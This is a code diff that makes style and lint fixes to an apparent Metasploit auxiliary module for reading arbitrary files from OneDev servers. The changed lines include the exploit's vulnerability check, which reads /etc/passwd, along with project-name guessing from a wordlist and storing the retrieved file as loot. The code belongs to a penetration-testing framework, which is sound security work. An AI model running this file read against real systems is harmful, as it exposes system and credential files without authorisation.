@@ -44,9 +44,9 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
         OptString.new('PROJECT_NAME', [true, 'The target OneDev project name', '']),
         OptPath.new('PROJECT_NAMES_FILE', [
-                      false, 'File containing project names to try, one per line',
-                      File.join(Msf::Config.data_directory, 'wordlists', 'namelist.txt')
-                    ])
+          false, 'File containing project names to try, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'namelist.txt')
+        ])
       ]
     )
   end
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
 
     return CheckCode::Unknown('Request failed') unless res
 
-    unless ["OneDev", "var redirect = '/~login';"].any? { |f| res.body.include? f }
+    unless ['OneDev', "var redirect = '/~login';"].any? { |f| res.body.include? f }
       return CheckCode::Unknown("The target isn't a OneDev instance.")
     end
 
@@ -68,14 +68,14 @@ class MetasploitModule < Msf::Auxiliary
     if version.nil?
       if datastore['PROJECT_NAME']
         res = read_file(datastore['PROJECT_NAME'], '/etc/passwd')
-        
+
         if res.body.include? 'root:x:0:0:root:'
-          return CheckCode::Vulnerable("OneDev instance is vulnerable.")
+          return CheckCode::Vulnerable('OneDev instance is vulnerable.')
         else
-          return CheckCode::Safe("OneDev instance is not vulnerable.")
+          return CheckCode::Safe('OneDev instance is not vulnerable.')
         end
       end
-      return CheckCode::Unknown("Unable to detect the OneDev version, as the instance does not have anonymous access enabled.")
+      return CheckCode::Unknown('Unable to detect the OneDev version, as the instance does not have anonymous access enabled.')
     end
 
     version = Rex::Version.new(version[0])
@@ -123,17 +123,17 @@ class MetasploitModule < Msf::Auxiliary
     project_name = datastore['PROJECT_NAME']
 
     if project_name.strip.empty?
-      project_name = find_project 
+      project_name = find_project
       fail_with(Failure::NoTarget, 'No valid OneDev project was found.') unless project_name
     else
-      fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)      
+      fail_with(Failure::NoTarget, 'Provided project name is invalid.') unless validate_project_exists(project_name)
     end
 
     res = read_file(project_name, datastore['TARGETFILE'])
 
     fail_with(Failure::Unreachable, 'Request timed out.') unless res
 
-    fail_with(Failure::UnexpectedReply, "Target file #{datastore['TARGETFILE']} not found.") unless !res.body.include? 'Site file not found'
+    fail_with(Failure::UnexpectedReply, "Target file #{datastore['TARGETFILE']} not found.") if res.body.include? 'Site file not found'
 
     file_name = datastore['TARGETFILE']
     if datastore['STORE_LOOT']
